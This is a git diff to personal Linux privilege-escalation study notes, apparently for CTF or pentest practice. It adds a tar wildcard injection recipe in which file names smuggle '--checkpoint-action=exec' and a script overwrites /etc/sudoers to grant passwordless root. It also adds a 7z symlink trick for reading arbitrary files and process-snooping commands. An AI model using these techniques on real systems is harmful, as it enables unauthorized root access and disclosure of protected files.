@@ -51,6 +51,10 @@
         OpenBSD: pkg_add, OpenBSD Ports
     ```
 - ``` find / -writable -type d 2>/dev/null ``` find all writable file of current user
+### Writable file
+1. Not every file can be replaced and move so try to modify the content by echo
+2. try ``` echo "sussy thing" > {writable file} ```
+
 - ``` find / -user {username} -ls 2>/dev/null ``` find all files the user own
 - ``` find / -group {groupname} -ls 2>/dev/null ```  find all files the group own
 - ``` mount ``` check all mounted filesystems
@@ -96,7 +100,7 @@
 ## Service footprints
 - ``` watch -n 1 "ps -aux | grep pass" ``` process
 - ``` sudo tcpdump -i lo -A | grep "pass" ``` tcp traffic
-- ``` pspy ``` but dunno how use yet
+- ``` timeout 2m ./pspy64 ``` but dunno how use yet
 
 # Bad File permissions 
 ## Cron jobss hack
@@ -124,19 +128,36 @@
 - go gtfobins look for Capabilities 
 - find harder (lookup all bins & PwnKits!!)
 
-### Binary hacks
+### Wildcard Spare tricks
+- https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks
 1. wildcards with tar in bash script: https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa 
 -   ```
-        # 1. Create files in the current directory called
+        # 1. CD to the backup dir
+        cd /var/www/html/uploads
+
+        # 2. Create files in the current directory called
         # '--checkpoint=1' and '--checkpoint-action=exec=sh privesc.sh'
 
         echo "" > '--checkpoint=1'
         echo "" > '--checkpoint-action=exec=sh privesc.sh'
 
-        # 2. Create a privesc.sh bash script, that allows for privilege escalation
+        # 3. Create a privesc.sh bash script, that allows for privilege escalation
         #malicous.sh:
         echo '{current username} ALL=(root) NOPASSWD: ALL' > /etc/sudoers
     ```
+2. 7z / 7za (read file by error e.g. backup.log)
+   - As the content of this file isn't a list of files -> error will print that file value 
+   ```
+        # 1. CD the backup dir
+            cd /var/www/html/uploads
+        
+        # 2. create a file
+            touch @root.txt
+        
+        # 3. add symlink
+            ln -s /file/you/want/to/read root.txt
+
+   ```
 
 ### Write to system files for misconfigure Bins
 - Example: dosbox w/ SUID
